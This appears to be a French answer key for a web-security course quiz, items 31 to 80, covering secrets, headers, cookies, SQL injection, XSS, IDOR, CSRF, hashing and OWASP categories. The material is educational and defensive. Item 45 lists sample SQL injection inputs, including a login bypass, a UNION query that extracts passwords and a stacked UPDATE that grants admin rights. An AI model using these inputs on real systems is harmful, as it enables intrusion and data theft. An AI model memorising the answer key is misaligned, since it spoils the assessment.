**31.** Faux — *Exact, c'est faux : un secret ne doit jamais figurer dans le code source. Un secret commité est un secret exposé.*

**32.** (c) Les placer dans un fichier .env exclu du versioning, ou dans des variables d'environnement — *Exact, et pour les projets avancés, utiliser un coffre-fort comme HashiCorp Vault.*

**33.** GitLeaks (accepté aussi : gitleaks, TruffleHog, trufflehog, git-secrets)

**34.** (b) Base64

**35.** (c) Dans le header Authorization (Bearer) — *Exact, jamais dans l'URL : les paramètres GET restent dans l'historique du navigateur et les logs du serveur.*

**36.** (b) À limiter le nombre d'appels pour bloquer les attaques par force brute — *Exact, par exemple le middleware throttle de Laravel.*

**37.** Content-Security-Policy → Limiter les sources de scripts et de contenu (protection XSS) ; Strict-Transport-Security → Forcer le navigateur à n'utiliser que HTTPS ; X-Frame-Options → Empêcher le clickjacking ; X-Content-Type-Options → Empêcher le navigateur de deviner le type MIME

**38.** (b) SameSite=Strict (ou Lax) ; (c) Secure ; (e) HttpOnly — *Exact, il protège contre le CSRF. / Exact, le cookie n'est envoyé que sur HTTPS. / Exact, il empêche JavaScript d'accéder au cookie (protection XSS).*

**39.** (b) À auditer la sécurité d'une application Web en testant ses vulnérabilités — *Exact, il peut même tourner en mode headless dans une CI pour détecter les régressions.*

**40.** (a) Intégrer la sécurité dès la phase de développement, pas seulement en production — *Exact : analyse statique (SAST), scan de dépendances (SCA), scan de secrets et tests de sécurité automatisés dans la CI.*

**41.** (a) La donnée est collée dans la chaîne avant le prepare(), elle fait déjà partie du texte SQL — *Exact, préparer une requête déjà concaténée ne protège de rien : le ? doit remplacer la donnée, qui n'arrive qu'avec execute([...]).*

**42.** (b) dans la donnée passée à execute()

**43.** (c) PDO lève une exception (Invalid parameter number) et rien n'est inséré, c'est un bug et non une faille — *Exact, un ? entre guillemets n'est pas un emplacement mais un simple caractère : la requête n'attend aucun paramètre alors qu'execute() en reçoit deux.*

**44.** Faux — *Exact, c'est faux : chaque réponse donne un oui ou un non, ce qui suffit à reconstituer une donnée caractère par caractère (avec substr). Cacher les messages ralentit l'attaque sans la corriger.*

**45.** admin' -- → Contourner une connexion en mettant en commentaire la vérification du mot de passe ; 1 OR 1=1 → Rendre une condition toujours vraie pour récupérer toutes les lignes ; ' UNION SELECT login, password FROM users -- → Recoller les colonnes d'une autre table dans le résultat affiché ; 1; UPDATE users SET role='admin' → Enchaîner une seconde requête qui modifie la base

**46.** escapeshellarg (accepté aussi : escapeshellarg())

**47.** (d) Vérifier la page demandée dans une liste blanche de pages autorisées (in_array) avant de l'inclure — *Exact, l'utilisateur ne peut plus inclure que les pages que vous avez prévues.*

**48.** (b) Le guillemet ferme l'attribut src, puis la saisie ajoute un attribut onload qui contient du JavaScript — *Exact, le navigateur reçoit un HTML parfaitement valide et exécute le onload.*

**49.** Faux — *Exact, c'est faux : elle ne touche que la personne qui envoie le code, ou celle à qui on envoie le lien piégé. C'est la XSS stockée, enregistrée en base, qui touche tous les visiteurs.*

**50.** (a) Le formulaire n'a ni method="post" ni action, il envoie en GET et $_POST['content'] reste vide ; (c) Les commentaires sont réaffichés sans échappement : c'est une XSS stockée — *Exact, un bug à corriger en même temps. / Exact, un seul commentaire piégé frappe tous les visiteurs.*

**51.** htmlspecialchars() → Transformer les caractères spéciaux en entités HTML pour qu'ils s'affichent comme du texte ; strip_tags() → Supprimer purement et simplement les balises HTML ; escapeshellarg() → Transmettre une saisie comme un simple argument à une commande shell ; hash_equals() → Comparer deux secrets en temps constant

**52.** (c) Il envoie discrètement le cookie de session de la victime vers le serveur de l'attaquant, qui peut se connecter à sa place — *Exact, d'où l'intérêt de l'option HttpOnly sur le cookie de session : document.cookie ne le voit plus.*

**53.** Faux — *Exact, c'est faux : un attribut comme onerror ou onload sur une autre balise exécute aussi du JavaScript. La bonne protection reste d'échapper à l'affichage (htmlspecialchars).*

**54.** (a) Stocker la saisie brute et l'échapper avec htmlspecialchars au moment de l'afficher — *Exact, la donnée d'origine reste intacte et la protection est faite au bon endroit (l'affichage).*

**55.** (a) Une énumération : l'utilisateur teste les identifiants les uns après les autres pour trouver des factures qui ne sont pas les siennes — *Exact, ce n'est pas un comportement humain normal.*

**56.** IDOR

**57.** 403 — *Exact, 403 (interdit) : 404 est réservé à une facture qui n'existe pas.*

**58.** (b) Que la facture appartient à l'utilisateur connecté (user_id comparé à Auth::id(), sinon 403) ; (d) Que la facture existe (sinon 404) — *Exact, c'est la vérification de propriété oubliée dans le TP 3. / Exact.*

**59.** (c) Un filtre exécuté avant le contrôleur, qui laisse passer la requête ou la bloque (redirection ou 403) — *Exact, le test du rôle est écrit une seule fois pour tout le groupe.*

**60.** (b) La page qui liste les factures de tous les utilisateurs est accessible sans être administrateur — *Exact, le middleware ne protège que les routes déclarées dans son groupe.*

**61.** (a) automatisé, avec une alerte

**62.** (d) password_verify

**63.** (a) Le filtre altère des caractères légitimes (&lt;, &, "): le mot de passe stocké n'est plus celui saisi et il est affaibli — *Exact, on ne nettoie pas un mot de passe, on le hache tel quel.*

**64.** (b) $2y$10$Kq3eX2vB0cQh8mN1rT5uLe8yZ4pW6sA9dF7gH2jK3lM0nO1pQ2rS — *Exact, le préfixe $2y$ indique bcrypt et 10 est le coût. Le sel est intégré au hash.*

**65.** (d) Rendre l'attaque par force brute trop lente pour être rentable — *Exact, l'objectif n'est pas de la rendre impossible.*

**66.** (b) Parce qu'un attaquant peut vider ses cookies et repartir avec une session neuve, donc un compteur remis à zéro — *Exact, d'où un vrai mécanisme de rate limiting comme le RateLimiter de Laravel.*

**67.** Faux — *Exact, c'est faux : une simple image piégée dans un email suffit à faire charger cette URL par le navigateur de l'admin connecté, qui joint tout seul son cookie de session. C'est une faille CSRF.*

**68.** (c) Parce qu'un site piégé peut contenir un formulaire POST soumis automatiquement vers votre site, avec la session de la victime — *Exact, le POST bloque l'image piégée, mais seul un jeton inconnu du site tiers bloque le formulaire forgé.*

**69.** (d) Pour éviter une attaque temporelle : === s'arrête au premier caractère différent, et le temps de réponse trahit le nombre de caractères corrects — *Exact, hash_equals() compare toujours les chaînes en entier, en temps constant.*

**70.** session_regenerate_id (accepté aussi : session_regenerate_id(), session_regenerate_id(true))

**71.** 30 — *Exact, et un bon code a une durée de vie courte et un usage unique.*

**72.** (b) C'est très mauvais signe : le site stocke le mot de passe en clair ou de façon réversible — *Exact, un mot de passe haché ne peut pas être retrouvé. Le site devrait envoyer un lien unique et temporaire de réinitialisation.*

**73.** A01 → Contrôles d'accès défaillants (dont IDOR, CSRF, SSRF) ; A03 → Défaillances de la chaîne d'approvisionnement logicielle ; A05 → Injection (SQL, OS, XSS…) ; A09 → Carence de journalisation et d'alerte

**74.** (b) En cas d'erreur, tout le monde devient administrateur : c'est un comportement « fail open », il faut refuser l'accès par défaut — *Exact, c'est la catégorie A10 : en cas d'erreur, on journalise et on met $isAdmin à false (« fail closed »).*

**75.** (c) integrity

**76.** (d) Le cookie est modifiable par le visiteur et unserialize peut créer des objets : on utilise json_decode et on valide le contenu — *Exact, c'est un manque d'intégrité des données (A08).*

**77.** (a) Supprimer les exemples de code et les répertoires de debug ; (b) Passer display_errors à Off et garder les erreurs dans les logs (log_errors = On) ; (c) Désactiver le listage des répertoires (Options -Indexes) — *Exact. / Exact. / Exact.*

**78.** (b) composer install (ou npm ci) puis composer audit (ou npm audit) — *Exact, les mêmes versions partout, et un contrôle des failles connues.*

**79.** (c) Un lien unique et temporaire envoyé par email — *Exact, une question secrète avec peu de réponses possibles se devine facilement : c'est une conception non sécurisée (A06).*

**80.** (b) Le slopsquatting, une forme de Supply Chain Attack — *Exact, d'où la règle : vérifier chaque dépendance ajoutée par l'IA.*
